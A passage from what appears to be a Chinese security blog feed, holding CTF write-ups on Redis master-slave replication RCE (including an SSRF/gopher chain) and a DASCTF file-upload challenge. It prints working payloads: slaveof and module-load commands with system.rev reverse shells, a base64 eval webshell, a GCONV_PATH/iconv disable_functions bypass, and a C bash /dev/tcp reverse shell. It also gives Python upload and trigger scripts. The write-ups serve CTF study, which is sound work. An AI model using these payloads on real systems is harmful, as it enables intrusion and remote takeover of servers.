title="漏洞原理"></a>漏洞原理</h2><p>redis提供了主从模式，把多个redis实例分为一个主机和多个从机，主机负责写，从机负责读，二者存储的数据相同，但读写分离可以大幅度减轻流量压力</p><p>在Redis  4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令</p><p>简单的说，攻击者（主机)写一个so文件，然后通过FULLRESYNC(全局)同步文件到受害者(机)上</p><p>一般用工具<a href="https://github.com/n0b0dyCN/redis-rogue-server">redis-rogue-server</a>实施攻击</p><h2 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h2><p>靶机存在未授权漏洞/可以远程登录</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 靶机ip --lhost 攻击者ip</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409191431056.png" alt="image-20220409191431056"></p><p>工具运行之后可以选择获得一个交互式的shell(interactive shell)或者是反弹shell(reserve shell)，选择反弹shell，并输入攻击机的ip和port，成功反弹</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409191707483.png" alt="image-20220409191707483"></p><h1 id="Redis本地主从复制rce漏洞"><a href="#Redis本地主从复制rce漏洞" class="headerlink" title="Redis本地主从复制rce漏洞"></a>Redis本地主从复制rce漏洞</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>若一个redis服务器绑定了本地登录，此时远程主从复制就失效了，但是还可以配合其它的一些漏洞在本地登录redis，并把攻击机redis设为主机，靶机redis设为从机，通过一些命令从主机同步恶意so文件到从机，然后加载system等模块进来，以达到rce的效果</p><h2 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h2><p>有其它漏洞（ssrf等）供攻击者本地登录redis</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先要用到一个工具<a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">Awsome-Redis-Rogue-Server</a>，开启它作为主服务器，默认端口为15000，可以通过<code>-lport</code>命令来改变</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py -v -path exp.so  //这个so文件从redis-rogue-server那里复制来</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409205537890.png" alt="image-20220409205537890"></p><p>这里复现就直接在靶机上连redis了，实操中应该是通过某个漏洞连，然后设一下路径，文件名，主机</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof <span class="number">192.168</span><span class="number">.80</span><span class="number">.3</span> <span class="number">15000</span></span><br></pre></td></tr></table></figure><p>设好后就可以看到攻击机这边已经开始在同步恶意so文件了</p><p><img src="/2022/04/10/%E4%B8%80%E4%BA%9BRedis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220409210201860.png" alt="image-20220409210201860"></p><p>检查靶机，找到exp.so</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409210454778.png" alt="image-20220409210454778"></p><p>关闭同步，加载exp.so，利用加载好的system模块反弹shell</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">slaveof no <span class="literal">one</span></span><br><span class="line">module <span class="built_in">load</span> ./<span class="built_in">exp</span>.so</span><br><span class="line"><span class="keyword">system</span>.rev <span class="number">192.168</span><span class="number">.80</span><span class="number">.3</span> <span class="number">2333</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409210856446.png" alt="image-20220409210856446"></p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409210926346.png" alt="image-20220409210926346"></p><h1 id="例题-网鼎杯玄武组-SSRF-Me"><a href="#例题-网鼎杯玄武组-SSRF-Me" class="headerlink" title="例题-网鼎杯玄武组 SSRF Me"></a>例题-网鼎杯玄武组 SSRF Me</h1><p>SSRF + Redis本地主从复制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        safe_request_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>http://0.0.0.0/hint.php</code>来绕过访问hint.php（这个点也很经典），得关键信息：<code>redis pass is root</code></p><p>知道了密码，接下来利用Goher协议打redis本地主从复制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//首先在vps上面启动Awsome-Redis-Rogue-Server</span><br><span class="line">python3 redis_rogue_server.py -v -path exp.so</span><br><span class="line"></span><br><span class="line">//然后在靶机上登录,修改路径和文件名,设置主机</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">config <span class="built_in">set</span> dir /tmp/</span><br><span class="line">config <span class="built_in">set</span> dbfilename exp.so</span><br><span class="line">slaveof vps port</span><br><span class="line">quit</span><br><span class="line">//加载模块</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">module load ./exp.so</span><br><span class="line">quit</span><br><span class="line">//关闭同步并反弹shell</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">slaveof NO ONE</span><br><span class="line">system.rev vps port</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>以上payload均要url编码两次，依次输入后，成功反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220410104216186.png" alt="image-20220410104216186"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前VNCTF的时候遇到过一道redis的题，这几天想起来了，复现时那题反弹shell也没成功，于是就复现了一些redis的漏洞，做了道例题</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DASCTF2022三月挑战赛Web复现</title>
    <link href="https://wuyusanhua2021.github.io/2022/03/26/DASCTF2022-Web/"/>
    <id>https://wuyusanhua2021.github.io/2022/03/26/DASCTF2022-Web/</id>
    <published>2022-03-26T10:36:53.000Z</published>
    <updated>2022-03-28T11:39:26.401Z</updated>
    
    <content type="html"><![CDATA[<h1 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h1><p>先上传文件读源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ([<span class="string">&#x27;fi&#x27;</span>,<span class="string">&#x27;le_get_contents&#x27;</span>][<span class="number">0</span>].[<span class="string">&#x27;fi&#x27;</span>,<span class="string">&#x27;le_get_contents&#x27;</span>][<span class="number">1</span>])(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>, strtolower(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(fun(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = md5(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>黑名单过滤，<code>phpinfo</code>没有被ban，上传文件读phpinfo，disable_functions屏蔽了巨大多函数，但是可以通过<code>GCONV_PATH</code>与<code>iconv</code>进行diable_functions bypass，再此之前先传两个文件，1.php是base64编码后的任意命令执行，exp.php通过文件包含+php伪协议的方式将1.php引入，这样就可以成功绕过黑名单，方便后面传文件和触发bypass反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"><span class="comment">//<span class="meta">&lt;?php</span> eval($_REQUEST[1]);<span class="meta">?&gt;</span></span></span><br><span class="line">PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOz8+</span><br><span class="line"></span><br><span class="line"><span class="comment">//exp.php</span></span><br><span class="line"><span class="comment">//php://filter/convert.base64-decode/resource=f3b94e88bd1bd325af6f62828c8785dd.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">Include</span>(base64_decode(<span class="string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1mM2I5NGU4OGJkMWJkMzI1YWY2ZjYyODI4Yzg3ODVkZC5waHA=&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>关于<code>GCONV_PATH</code>与<code>iconv</code>的前置知识：</p><blockquote><p>php在执行iconv函数时，实际上是调用glibc中的iconv相关函数，其中一个很重要的函数叫做iconv_open()。</p><p>php的iconv函数的第一个参数是字符集的名字，这个参数也会传递到glibc的iconv_open函数的参数中。</p><p>下面我们来看一下iconv_open函数的执行过程：</p><ol><li>iconv_open函数首先会找到系统提供的gconv-modules文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置。</li><li>然后再根据gconv-modules文件的指示去链接参数对应的.so文件。</li><li>之后会调用.so文件中的gconv()与gonv_init()函数。</li><li>然后就是一些与本漏洞利用无关的步骤。</li></ol><p>linux系统提供了一个环境变量：GCONV_PATH，该环境变量能够使glibc使用用户自定义的gconv-modules文件，因此，如果指定了GCONV_PATH的值，iconv_open函数的执行过程会如下：</p><ol><li>iconv_open函数依照GCONV_PATH找到gconv-modules文件。</li><li>根据gconv-modules文件的指示找到参数对应的.so文件。</li><li>调用.so文件中的gconv()和gonv_init()函数。</li><li>一些其他步骤。</li></ol><p>我们的利用方式就是首先在某一文件夹（一般是/tmp）中上传gconv-modules文件，文件中指定我们自定义的字符集文件的.so，然后我们再在.so文件中的gonv_init()函数中书写命令执行函数，之后上传php的shell，内容是使用php设定GCONV_PATH指向我们的gconv-modules文件，然后使用iconv函数使我们的恶意代码执行。</p><ol><li>当我们使用浏览器访问我们上传的shell之后，服务器会做如下步骤：</li><li>设定GCONV_PATH指向我们的gconv-modules文件。</li><li>执行php的iconv函数，本质上调用了glibc的iconv_open函数。</li><li>iconv_open函数依照GCONV_PATH找到我们上传gconv-modules文件。</li><li>根据gconv-modules文件的指示找到参数对应的.so文件。</li><li>调用.so文件中的gconv()和gonv_init()函数，当然，其中是我们想要服务器执行的系统命令。</li></ol><p>.c文件和gconv-modules文件以及.so文件编译格式如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.c文件</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">void gconv() &#123;&#125;</span><br><span class="line">void gconv_init() &#123;</span><br><span class="line">  system(<span class="string">&quot;希望执行的命令&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gconv-modules文件</span><br><span class="line">module  自定义字符集名字（大写）<span class="regexp">//</span>    INTERNAL    ..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/自定义字符集名字（小写）    <span class="number">2</span></span><br><span class="line">module  INTERNAL    自定义字符集名字（大写）<span class="regexp">//</span>    ..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/自定义字符集名字（小写）    <span class="number">2</span></span><br><span class="line"></span><br><span class="line">编译.so文件</span><br><span class="line">gcc 源代码文件名.c -o 自定义字符集名.so -shared -fPIC</span><br></pre></td></tr></table></figure></blockquote><p>现在来写exp.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译生成exp.so</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp.so -shared -fPIC</span><br></pre></td></tr></table></figure><p>然后是写gconv-modules</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  EXP<span class="regexp">//</span>    INTERNAL    ..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/exp    <span class="number">2</span></span><br><span class="line">module  INTERNAL    EXP<span class="regexp">//</span>    ..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/exp    <span class="number">2</span></span><br></pre></td></tr></table></figure><p>接下来要把.so和gconv-modules传到<code>/tmp</code>目录下，因为前面已经有了个exp.php来任意命令执行，所以写脚本把文件传到exp.php这里，然后利用<code>move_uploaded_file()</code>把文件移过去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4f7a8912-09e1-48ae-be66-122c0571b048.node4.buuoj.cn:81/uploads/391d979c9bbf4ea554411fb5f1c5065b.php&quot;</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;$temp_file = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];move_uploaded_file($temp_file, &#x27;/tmp/gconv-modules&#x27;);&quot;</span></span><br><span class="line">res = requests.post(url,data=&#123;<span class="string">&quot;1&quot;</span>:code&#125;,files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;gconv-modules&quot;</span>,<span class="built_in">open</span>(<span class="string">&quot;gconv-modules&quot;</span>,<span class="string">&quot;rb&quot;</span>),<span class="string">&quot;application/oct-stream&quot;</span>)&#125;)</span><br><span class="line"><span class="comment"># code = &quot;$temp_file = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];move_uploaded_file($temp_file, &#x27;/tmp/exp.so&#x27;);&quot;</span></span><br><span class="line"><span class="comment"># res = requests.post(url,data=&#123;&quot;1&quot;:code&#125;,files=&#123;&quot;file&quot;:(&quot;exp.so&quot;,open(&quot;exp.so&quot;,&quot;rb&quot;),&quot;application/oct-stream&quot;)&#125;)</span></span><br><span class="line"><span class="built_in">print</span>(res.status_code)</span><br></pre></td></tr></table></figure><p>最后用payload触发bypass反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4f7a8912-09e1-48ae-be66-122c0571b048.node4.buuoj.cn:81/uploads/391d979c9bbf4ea554411fb5f1c5065b.php&quot;</span></span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;putenv(&#x27;GCONV_PATH=/tmp/&#x27;);include(&#x27;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#x27;);&quot;</span></span><br><span class="line">res = requests.post(url,data = &#123;<span class="string">&quot;1&quot;</span>:poc&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.status_code)</span><br></pre></td></tr></table></figure><p><img src="/2022/03/26/DASCTF2022-Web/image-20220328191853374.png" alt="image-20220328191853374"></p><p>flag就在根目录下，但没有权限去读</p><p><img 